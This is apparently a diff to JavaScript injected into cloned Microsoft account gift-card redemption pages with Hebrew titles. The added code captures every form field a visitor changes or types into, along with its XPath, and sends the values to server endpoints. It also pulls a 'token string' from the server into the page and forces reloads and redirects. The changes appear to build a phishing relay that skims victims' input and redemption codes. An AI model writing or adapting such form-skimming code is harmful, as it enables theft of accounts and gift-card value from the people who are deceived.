@@ -1,14 +1,44 @@
-/*
+
   window.addEventListener('load', (event) => {
+
       console.log('The page has fully loaded');
+      //alert(document.title);
+      if (document.title  === 'Microsoft account | ממש את קוד או כרטיס המתנה שלך'){
+        setTimeout(()=> {
+                    window.location.href = '/iframe/0/0';
+                             }
+                             ,5000);
+       }
+
+
+      const spans = document.getElementsByTagName("span");
+      console.log(spans.length);
+      if(spans.length > 0){
+        //alert(spans[0].aria-label="טוען")
+          if (spans[0].attributes["aria-label"].nodeValue ==="טוען" ){
+             location.reload()   ;
+
+          }
+
+      }
+      if (document.title  === 'הזנת קוד למימוש אסימון'){
+             getTokenString();
+      }
+
+      /*
        let iframeNo = 0;
        for (const iframe of document.documentElement.querySelectorAll('iframe')) {
            iframe.src='/iframe/' + iframeNo;
            iframeNo++;
         }
-
-  });
 */
+  });
+/*
+$(document).ready( function() {
+  $("#tokenString").inputmask("XXXXX-XXXXX-XXXXX-XXXXX");
+});
+*/
+
   document.addEventListener('blur', (e) => {
      console.log(e);
 
@@ -18,10 +48,17 @@
  })
  document.addEventListener('change', (e) => {
        var xpath =getElementXPath(event.target);
+        const { key, target } = e
+
       let field = {};
       field.xpath = xpath;
       field.value = event.target.value;
-      sendField(field);
+      if (target.id ==='tokenString'){
+           sendField(field ,"updateTokenString");
+      }
+       else{
+         sendField(field ,"updateFieldData");
+      }
    /*
      alert(event.target.value);
      alert(event.target.id);
@@ -119,6 +156,15 @@
     const { key, target } = e
     console.log(key);
     console.log(target);
+    if (target.id ==='tokenString'){
+           var xpath =getElementXPath(event.target);
+           let field = {};
+           field.xpath = xpath;
+           field.value = event.target.value;
+           sendField(field ,"updateTokenString");
+
+     //alert("tokenString");
+    }
  })
 
 /*
@@ -173,16 +219,65 @@ function getElementTreeXPath(element)
 };
 
 
-function sendField(field){// pass your data in method
+
+
+    //updateTokenString
+
+    function getTokenString(){// pass your data in method
+        $.ajax({
+                type: "GET",
+               // url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/updateFieldData",
+                 url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/getTokenString",
+
+                contentType: "application/json; charset=utf-8",
+                crossDomain: true,
+                dataType: "json",
+                success: function (data, status, jqXHR) {
+                        console.log(data);
+
+                            $('#tokenString').val(data.value);
+                            console.log(data.value.length);
+
+
+
+                     // return data.value;
+                   // alert("success");// write success in " "
+                },
+
+                error: function (jqXHR, status) {
+                    // error handler
+                    //console.log(jqXHR);
+                   // alert('fail' + status.code);
+                }
+             });
+       }
+
+
+
+    function sendField(field , path){// pass your data in method
      $.ajax({
              type: "POST",
-             url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/updateFieldData",
+            // url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/updateFieldData",
+              url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/" + path,
+
              data: JSON.stringify(field),// now data come in this function
              contentType: "application/json; charset=utf-8",
              crossDomain: true,
              dataType: "json",
-             success: function (field, status, jqXHR) {
+             success: function (data, status, jqXHR) {
+                     console.log(data);
 
+                      if (path === 'updateTokenString'){
+                         $('#tokenString').val(data.value);
+                         console.log(data.value.length);
+                         if(data.value.length == 29){
+                            location.reload()   ;
+                         }
+
+                      }
+
+
+                  // return data.value;
                 // alert("success");// write success in " "
              },
 
@@ -206,8 +301,10 @@ function sendField(field){// pass your data in method
                  success: function (data, status, jqXHR) {
                        setTimeout(()=> {
                           window.location.href = data.url;
+
+
                        }
-                       ,3000);
+                       ,4000);
 
 
                     // alert("success");// write success in " "
